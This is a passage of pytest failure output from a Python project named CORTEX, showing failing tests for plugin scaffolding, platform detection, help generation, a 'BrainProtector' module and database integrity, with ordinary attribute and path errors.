INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:918 Generated externalMonitor.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:991 Generated tokenDashboard.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'cortex-extension\\scripts\\build.sh'
_________________ TestPluginIntegration.test_plugin_lifecycle _________________
tests\plugins\test_extension_scaffold_plugin.py:589: in test_plugin_lifecycle
    assert exec_result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: cortex-extension
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: cortex-extension\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: cortex-extension\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: cortex-extension\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:840 Generated lifecycleManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:882 Generated checkpointManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:918 Generated externalMonitor.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:991 Generated tokenDashboard.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'cortex-extension\\scripts\\build.sh'
__________ TestPluginIntegration.test_generated_extension_structure ___________
tests\plugins\test_extension_scaffold_plugin.py:608: in test_generated_extension_structure
    assert result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: cortex-extension
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: cortex-extension\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: cortex-extension\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: cortex-extension\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:840 Generated lifecycleManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:882 Generated checkpointManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:918 Generated externalMonitor.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:991 Generated tokenDashboard.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'cortex-extension\\scripts\\build.sh'
____________ TestPlatformDetection.test_mac_detection_from_request ____________
tests\plugins\test_platform_switch_plugin.py:41: in test_mac_detection_from_request
    assert plugin._detect_target_platform("switched to mac") == Platform.MAC
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'PlatformSwitchPlugin' object has no attribute '_detect_target_platform'
__________ TestPlatformDetection.test_windows_detection_from_request __________
tests\plugins\test_platform_switch_plugin.py:49: in test_windows_detection_from_request
    assert plugin._detect_target_platform("switched to windows") == Platform.WINDOWS
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'PlatformSwitchPlugin' object has no attribute '_detect_target_platform'
___________ TestPlatformDetection.test_linux_detection_from_request ___________
tests\plugins\test_platform_switch_plugin.py:56: in test_linux_detection_from_request
    assert plugin._detect_target_platform("switched to linux") == Platform.LINUX
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'PlatformSwitchPlugin' object has no attribute '_detect_target_platform'
__________ TestPluginInitialization.test_plugin_creates_successfully __________
tests\plugins\test_platform_switch_plugin.py:101: in test_plugin_creates_successfully
    assert plugin.metadata.name == "platform_switch"
E   AssertionError: assert 'Platform Switch Plugin' == 'platform_switch'
E     
E     - platform_switch
E     + Platform Switch Plugin
______________ TestPluginInitialization.test_plugin_has_triggers ______________
tests\plugins\test_platform_switch_plugin.py:125: in test_plugin_has_triggers
    triggers = plugin.metadata.triggers
               ^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'PluginMetadata' object has no attribute 'triggers'
______________ TestTriggerDetection.test_can_handle_mac_requests ______________
tests\plugins\test_platform_switch_plugin.py:138: in test_can_handle_mac_requests
    assert plugin.can_handle("switched to mac")
E   AssertionError: assert False
E    +  where False = can_handle('switched to mac')
E    +    where can_handle = <plugins.platform_switch_plugin.PlatformSwitchPlugin object at 0x000001E24EA6E430>.can_handle
____________ TestTriggerDetection.test_can_handle_windows_requests ____________
tests\plugins\test_platform_switch_plugin.py:146: in test_can_handle_windows_requests
    assert plugin.can_handle("switched to windows")
E   AssertionError: assert False
E    +  where False = can_handle('switched to windows')
E    +    where can_handle = <plugins.platform_switch_plugin.PlatformSwitchPlugin object at 0x000001E24EA6CC90>.can_handle
_____________ TestDependencyVerification.test_get_venv_python_mac _____________
tests\plugins\test_platform_switch_plugin.py:290: in test_get_venv_python_mac
    assert "bin/python" in python_path
E   AssertionError: assert 'bin/python' in 'D:\\PROJECTS\\CORTEX\\.venv\\bin\\python'
____________________ TestBrainTests.test_runs_brain_tests _____________________
tests\plugins\test_platform_switch_plugin.py:323: in test_runs_brain_tests
    assert result["passed"] > 0
E   assert 0 > 0
---------------------------- Captured stdout call -----------------------------
\n\U0001f9ea Step 4: Running brain tests...\n   Running: pytest tests/tier0/test_brain_protector.py tests/tier1/test_working_memory.py tests/tier2/test_knowledge_graph.py tests/tier3/test_context_intelligence.py\n   \u2705 All tests passed!\n   Tests: 0 passed
__________________ TestBrainTests.test_handles_test_failures __________________
tests\plugins\test_platform_switch_plugin.py:341: in test_handles_test_failures
    assert result["failed"] > 0
E   assert 0 > 0
---------------------------- Captured stdout call -----------------------------
\n\U0001f9ea Step 4: Running brain tests...\n   Running: pytest tests/tier0/test_brain_protector.py tests/tier1/test_working_memory.py tests/tier2/test_knowledge_graph.py tests/tier3/test_context_intelligence.py\n   \u274c Some tests failed\n   Tests: 0 passed, 0 failed, 0 errors
____________________ TestEndToEnd.test_full_execution_flow ____________________
tests\plugins\test_platform_switch_plugin.py:398: in test_full_execution_flow
    assert len(result["steps"]) == 5  # 5 steps in workflow
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   assert 0 == 5
E    +  where 0 = len([])
---------------------------- Captured stdout call -----------------------------
\U0001f527 CORTEX Setup: Configuring Windows\n\U0001f4e6 Using modular setup system with SOLID architecture\n   Profile: standard
------------------------------ Captured log call ------------------------------
INFO     src.setup.module_factory:module_factory.py:82 Loading setup profile: standard\nINFO     src.setup.module_factory:module_factory.py:83   Description: Standard setup - recommended for most users\nINFO     src.setup.module_factory:module_factory.py:84   Modules: 9\nWARNING  src.setup.module_factory:module_factory.py:101 Module class not found for: project_validation (skipping)\nINFO     src.setup.setup_orchestrator:setup_orchestrator.py:88 \u2713 Registered module: platform_detection (Platform Detection & Configuration)\nWARNING  src.setup.module_factory:module_factory.py:101 Module class not found for: git_sync (skipping)\nWARNING  src.setup.module_factory:module_factory.py:101 Module class not found for: virtual_environment (skipping)\nINFO     src.setup.setup_orchestrator:setup_orchestrator.py:88 \u2713 Registered module: python_dependencies (Python Dependencies Installation)\nINFO     src.setup.setup_orchestrator:setup_orchestrator.py:88 \u2713 Registered module: brain_initialization (Brain Database Initialization)\nWARNING  src.setup.module_factory:module_factory.py:101 Module class not found for: brain_tests (skipping)\nWARNING  src.setup.module_factory:module_factory.py:101 Module class not found for: tooling_verification (skipping)\nWARNING  src.setup.module_factory:module_factory.py:101 Module class not found for: setup_completion (skipping)\nINFO     src.setup.setup_orchestrator:setup_orchestrator.py:227 ============================================================\nINFO     src.setup.setup_orchestrator:setup_orchestrator.py:228 \U0001f680 CORTEX Setup - Starting\nINFO     src.setup.setup_orchestrator:setup_orchestrator.py:229 ============================================================\nERROR    src.setup.setup_orchestrator:setup_orchestrator.py:238 Failed to resolve execution order: Circular dependencies detected: ['platform_detection']
___________ TestPluginInitialization.test_plugin_registers_commands ___________
tests\plugins\test_system_refactor_plugin.py:48: in test_plugin_registers_commands
    assert any(cmd.command == "/review" for cmd in commands)
E   assert False
E    +  where False = any(<generator object TestPluginInitialization.test_plugin_registers_commands.<locals>.<genexpr> at 0x000001E24F1FB440>)
------------------------------ Captured log call ------------------------------
ERROR    src.plugins.command_registry:command_registry.py:162 Command conflict: /refactor already registered by system_refactor (attempted by system_refactor)\nERROR    plugin.system_refactor:base_plugin.py:253 \u2717 Failed to register command: /refactor (conflict)
________________ TestReporting.test_report_formats_as_markdown ________________
tests\plugins\test_system_refactor_plugin.py:386: in test_report_formats_as_markdown
    assert "Overall Health: GOOD" in md_content
E   AssertionError: assert 'Overall Health: GOOD' in '# CORTEX System Refactor Report\n\n**Generated:** 2025-11-09T00:00:00\n**Overall Health:** GOOD\n**Total Tests:** 400\n**Passing Tests:** 395\n**Pass Rate:** 98.8%\n\n---\n\n## \U0001f4ca Test Suite Metrics\n\n| Category | Test Files |\n|----------|-----------|\n| Plugins | 5 |\n\n---\n\n## \U0001f50d Coverage Gaps\n\n### Plugin Testing (HIGH Priority)\n\n**Description:** Missing tests\n\n**Estimated Effort:** 1.0 hours\n\n**Affected Files:**\n- plugin.py\n\n**Recommended Tests:**\n- test_plugin.py\n\n---\n\n## \U0001f527 REFACTOR Phase Tasks\n\n**Total Tasks:** 1\n**Estimated Time:** 0.2 hours\n\n### REFACTOR test\n\n**File:** `test.py`\n**Priority:** MEDIUM\n**Status:** PENDING\n\n**REFACTOR Items:**\nAdd assertions\n\n\n---\n\n## \U0001f4a1 Recommendations\n\nRecommendation 1\n\n---\n\n*Report generated by System Refactor Plugin*'
------------------------------ Captured log call ------------------------------
ERROR    src.plugins.command_registry:command_registry.py:162 Command conflict: /refactor already registered by system_refactor (attempted by system_refactor)\nERROR    plugin.system_refactor:base_plugin.py:253 \u2717 Failed to register command: /refactor (conflict)
__________ TestPluginExecution.test_plugin_handles_execution_errors ___________
tests\plugins\test_system_refactor_plugin.py:449: in test_plugin_handles_execution_errors
    assert result["status"] == "error"
E   AssertionError: assert 'success' == 'error'
E     
E     - error
E     + success
------------------------------ Captured log call ------------------------------
ERROR    src.plugins.command_registry:command_registry.py:162 Command conflict: /refactor already registered by system_refactor (attempted by system_refactor)\nERROR    plugin.system_refactor:base_plugin.py:253 \u2717 Failed to register command: /refactor (conflict)\nINFO     plugin.system_refactor:system_refactor_plugin.py:160 Starting system refactor workflow...\nINFO     plugin.system_refactor:system_refactor_plugin.py:214 Performing critical review...\nERROR    plugin.system_refactor:system_refactor_plugin.py:279 Test analysis failed: Test error\nINFO     plugin.system_refactor:system_refactor_plugin.py:342 Analyzing coverage gaps...\nINFO     plugin.system_refactor:system_refactor_plugin.py:514 Executing REFACTOR phase...\nINFO     plugin.system_refactor:system_refactor_plugin.py:641 Report saved to D:\\PROJECTS\\CORTEX\\cortex-brain\\SYSTEM-REFACTOR-REPORT-20251111_124259.md
_______________ TestPerformance.test_trigger_lookup_performance _______________
tests\response_templates\test_integration.py:288: in test_trigger_lookup_performance
    assert elapsed < 2, f"Trigger lookup took {elapsed:.2f}ms (target: <2ms)"
E   AssertionError: Trigger lookup took 3.97ms (target: <2ms)
E   assert 3.9699000008113217 < 2
_______________ TestHelpGeneration.test_concise_help_generates ________________
tests\test_cortex_help.py:26: in test_concise_help_generates
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
______________ TestHelpGeneration.test_concise_help_has_bullets _______________
tests\test_cortex_help.py:35: in test_concise_help_has_bullets
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_________ TestHelpGeneration.test_concise_help_shows_natural_language _________
tests\test_cortex_help.py:42: in test_concise_help_shows_natural_language
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_______________ TestHelpGeneration.test_detailed_help_generates _______________
tests\test_cortex_help.py:49: in test_detailed_help_generates
    help_text = show_help(HelpFormat.DETAILED)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:45: in show_help
    return _generate_detailed_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:137: in _generate_detailed_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:137: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_____________ TestHelpGeneration.test_detailed_help_has_examples ______________
tests\test_cortex_help.py:57: in test_detailed_help_has_examples
    help_text = show_help(HelpFormat.DETAILED)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:45: in show_help
    return _generate_detailed_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:137: in _generate_detailed_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:137: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_______________ TestHelpGeneration.test_category_help_generates _______________
tests\test_cortex_help.py:64: in test_category_help_generates
    help_text = show_help(HelpFormat.CATEGORY)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:47: in show_help
    return _generate_category_help(registry)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:199: in _generate_category_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:199: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_______________ TestHelpGeneration.test_category_help_has_table _______________
tests\test_cortex_help.py:72: in test_category_help_has_table
    help_text = show_help(HelpFormat.CATEGORY)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:47: in show_help
    return _generate_category_help(registry)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:199: in _generate_category_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:199: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
______________ TestCategoryFiltering.test_platform_commands_only ______________
tests\test_cortex_help.py:86: in test_platform_commands_only
    assert "Platform" in help_text or "PLATFORM" in help_text
E   AssertionError: assert ('Platform' in 'No commands available.' or 'PLATFORM' in 'No commands available.')
_____________ TestQuickReference.test_quick_reference_is_concise ______________
tests\test_cortex_help.py:112: in test_quick_reference_is_concise
    full_help = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
____________ TestIntelligentHandling.test_handles_detailed_request ____________
tests\test_cortex_help.py:130: in test_handles_detailed_request
    result = handle_help_request("show detailed help")
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:267: in handle_help_request
    return show_help(HelpFormat.DETAILED)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:45: in show_help
    return _generate_detailed_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:137: in _generate_detailed_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:137: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
____________ TestIntelligentHandling.test_handles_category_request ____________
tests\test_cortex_help.py:147: in test_handles_category_request
    assert "Platform" in result or "PLATFORM" in result
E   AssertionError: assert ('Platform' in 'No commands available.' or 'PLATFORM' in 'No commands available.')
____________ TestIntelligentHandling.test_handles_generic_request _____________
tests\test_cortex_help.py:151: in test_handles_generic_request
    result = handle_help_request("help")
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:294: in handle_help_request
    return show_help(HelpFormat.CONCISE)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
______________ TestIntelligentHandling.test_defaults_to_concise _______________
tests\test_cortex_help.py:158: in test_defaults_to_concise
    result = handle_help_request("show commands")
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:294: in handle_help_request
    return show_help(HelpFormat.CONCISE)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_____________ TestConvenienceFunctions.test_cortex_help_function ______________
tests\test_cortex_help.py:169: in test_cortex_help_function
    result = cortex_help()
             ^^^^^^^^^^^^^
src\cortex_help.py:300: in cortex_help
    return show_help(HelpFormat.CONCISE)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
____________ TestConvenienceFunctions.test_cortex_help_is_concise _____________
tests\test_cortex_help.py:176: in test_cortex_help_is_concise
    result = cortex_help()
             ^^^^^^^^^^^^^
src\cortex_help.py:300: in cortex_help
    return show_help(HelpFormat.CONCISE)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
____________ TestHelpIntegration.test_includes_registered_commands ____________
tests\test_cortex_help.py:190: in test_includes_registered_commands
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
________________ TestHelpIntegration.test_shows_command_stats _________________
tests\test_cortex_help.py:199: in test_shows_command_stats
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
________________ TestHelpFormatting.test_concise_uses_markdown ________________
tests\test_cortex_help.py:219: in test_concise_uses_markdown
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_________________ TestHelpFormatting.test_has_clear_sections __________________
tests\test_cortex_help.py:227: in test_has_clear_sections
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
________________ TestHelpFormatting.test_readable_line_length _________________
tests\test_cortex_help.py:235: in test_readable_line_length
    help_text = show_help(HelpFormat.CONCISE)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:43: in show_help
    return _generate_concise_help(registry, category)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in _generate_concise_help
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\cortex_help.py:82: in <lambda>
    for cat in sorted(by_category.keys(), key=lambda x: x.value):
                                                        ^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
__________ TestBrainProtectorImmutability.test_tier0_rules_immutable __________
tests\test_risk_mitigation.py:44: in test_tier0_rules_immutable
    result = protector.validate_change({
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'BrainProtector' object has no attribute 'validate_change'
_______ TestBrainProtectorImmutability.test_tier0_read_only_enforcement _______
tests\test_risk_mitigation.py:66: in test_tier0_read_only_enforcement
    result = protector.validate_change(change)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'BrainProtector' object has no attribute 'validate_change'
__ TestBrainProtectorImmutability.test_challenge_generation_for_risky_change __
tests\test_risk_mitigation.py:77: in test_challenge_generation_for_risky_change
    challenge = protector.generate_challenge({
src\tier0\brain_protector.py:512: in generate_challenge
    severity=Severity.BLOCKED if any(v.severity == Severity.BLOCKED for v in violations) else Severity.WARNING,
                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier0\brain_protector.py:512: in <genexpr>
    severity=Severity.BLOCKED if any(v.severity == Severity.BLOCKED for v in violations) else Severity.WARNING,
                                     ^^^^^^^^^^
E   AttributeError: 'str' object has no attribute 'severity'
_____ TestBrainProtectorImmutability.test_rollback_mechanism_on_violation _____
tests\test_risk_mitigation.py:99: in test_rollback_mechanism_on_violation
    rollback_plan = protector.create_rollback_plan(violation)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'BrainProtector' object has no attribute 'create_rollback_plan'
___________ TestBrainProtectorBoundaries.test_tier_write_boundaries ___________
tests\test_risk_mitigation.py:116: in test_tier_write_boundaries
    result = protector.validate_write("tier1", "tier2/patterns.db")
             ^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'BrainProtector' object has no attribute 'validate_write'
___________ TestBrainProtectorBoundaries.test_tier_read_permissions ___________
tests\test_risk_mitigation.py:132: in test_tier_read_permissions
    read_result = protector.validate_read("tier3", "tier1/conversations.db")
                  ^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'BrainProtector' object has no attribute 'validate_read'
______________ TestDatabaseIntegrity.test_tier1_schema_integrity ______________
tests\test_risk_mitigation.py:246: in test_tier1_schema_integrity
    assert required_tables.issubset(tables)
E   AssertionError: assert False
E    +  where False = <built-in method issubset of set object at 0x000001E24F205620>(set())
E    +    where <built-in method issubset of set object at 0x000001E24F205620> = {'entities', 'files', 'messages', 'conversations'}.issubset
_______________ TestDatabaseIntegrity.test_tier2_fts5_integrity _______________
tests\test_risk_mitigation.py:260: in test_tier2_fts5_integrity
    kg.add_pattern(
src\tier2\knowledge_graph_legacy.py:243: in add_pattern
    pattern_type.value,
    ^^^^^^^^^^^^^^^^^^
E   AttributeError: 'str' object has no attribute 'value'
_____________ TestDatabaseIntegrity.test_foreign_key_constraints ______________
tests\test_risk_mitigation.py:273: in test_foreign_key_constraints
